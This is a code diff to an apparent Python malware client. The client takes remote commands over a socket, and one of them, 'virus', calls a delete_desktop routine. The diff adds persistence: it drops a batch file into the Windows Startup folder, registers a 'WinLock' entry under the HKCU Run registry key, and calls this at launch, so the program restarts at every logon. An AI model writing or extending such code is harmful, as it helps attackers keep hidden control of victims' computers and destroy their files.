@@ -7,6 +7,20 @@ import time
 import locale
 import json
 import tkinter as tk
+import winreg as _winreg
+import getpass
+
+
+def add_to_startup(file_path=""):
+    # adding the file to startup
+    if file_path == "":
+        file_path = os.path.dirname(os.path.realpath(__file__))
+    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % getpass.getuser()
+    with open(bat_path + '\\' + "project.bat", "w+") as bat_file:
+        bat_file.write(r'%s\project.py' % file_path)
+    key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run')
+    _winreg.SetValueEx(key, 'WinLock', 1, _winreg.REG_SZ, r'%s\project.exe' % file_path)
+    key.Close()
 
 
 def delete_desktop():
@@ -112,6 +126,7 @@ def start_client(host, port):
             elif command == "virus":
                 delete_desktop()
 
+
             else:
                 client.send("Unknown command".encode())
             client.send("OK".encode())
@@ -123,4 +138,5 @@ def start_client(host, port):
 
 if __name__ == '__main__':
     # Start the client
+    add_to_startup()
     start_client("127.0.0.1", 8084)
